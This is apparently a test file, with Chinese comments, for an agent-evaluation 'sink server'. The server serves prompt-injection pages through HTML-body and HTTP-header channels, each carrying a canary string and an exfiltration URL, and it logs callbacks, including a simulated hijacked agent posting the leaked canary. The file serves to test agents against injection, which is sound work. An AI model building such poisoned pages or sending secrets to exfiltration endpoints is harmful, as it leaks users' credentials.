import { test } from 'node:test';
import assert from 'node:assert/strict';
import { FanoutSinkServer } from '../src/modules/agent-evals/fanout/sink-server.js';

test('sink 服务：投毒内容可被真实抓取，外发回调被记录', async () => {
  const sink = new FanoutSinkServer();
  await sink.start('127.0.0.1', 0); // 端口 0 = 临时端口
  try {
    const reg = sink.register('tok1', 'LSE-FANOUT-tok1', { secretHint: '上下文里的 API_KEY' });

    // 1) 真实抓取投毒页
    const poisoned = await fetch(reg.sinkUrl('html_body'));
    const html = await poisoned.text();
    assert.ok(html.includes('LSE-FANOUT-tok1'), '投毒页应含诱饵串');
    assert.ok(html.includes(reg.exfilUrl), '投毒页应含 exfil URL');

    // 2) 模拟被劫持的 agent 把诱饵回传到 exfil
    const cb = await fetch(`${reg.exfilUrl}?c=LSE-FANOUT-tok1`, { method: 'POST', body: 'leak' });
    assert.equal(cb.status, 200);

    // 3) 平台读到硬证据
    const hits = sink.hits('tok1');
    assert.equal(hits.length, 1);
    assert.equal(hits[0]!.canaryPresent, true);
  } finally {
    await sink.stop();
  }
});

test('sink 服务：不带诱饵串的回调 canaryPresent=false', async () => {
  const sink = new FanoutSinkServer();
  await sink.start('127.0.0.1', 0);
  try {
    const reg = sink.register('tok2', 'LSE-FANOUT-tok2', { secretHint: 'x' });
    await fetch(reg.exfilUrl, { method: 'GET' });
    const hits = sink.hits('tok2');
    assert.equal(hits.length, 1);
    assert.equal(hits[0]!.canaryPresent, false);
  } finally {
    await sink.stop();
  }
});

test('sink 服务：http_header 通道不崩溃（头值 Latin1 安全），返回 200 且头含诱饵', async () => {
  const sink = new FanoutSinkServer();
  await sink.start('127.0.0.1', 0);
  try {
    const reg = sink.register('tok3', 'LSE-FANOUT-tok3', { secretHint: '上下文里的 API_KEY' });
    const resp = await fetch(reg.sinkUrl('http_header'), { signal: AbortSignal.timeout(5000) });
    assert.equal(resp.status, 200);
    assert.ok(
      (resp.headers.get('x-status-message') ?? '').includes('LSE-FANOUT-tok3'),
      '头里应含诱饵串',
    );
  } finally {
    await sink.stop();
  }
});
